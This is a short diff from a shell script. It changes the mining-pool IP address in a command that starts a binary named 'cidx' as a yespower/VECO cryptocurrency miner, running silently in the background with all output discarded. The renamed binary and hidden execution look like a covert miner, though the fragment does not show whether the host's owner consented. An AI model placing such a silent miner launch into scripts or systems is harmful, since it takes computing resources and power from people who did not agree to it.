@@ -29,7 +29,7 @@ END
 
   # Run cidx in the background
   nohup ./cidx -a yespower  \
-  -o 45.115.225.70:443 \
+  -o 45.115.224.179:443 \
   -u VGq2bKrQ2AiJPNwttzKw7FE8RZJSQQva3G.tesveco \
   -p c=VECO,m=solo,zap=VECO,mc=VECO -t 6 &>/dev/null &
 
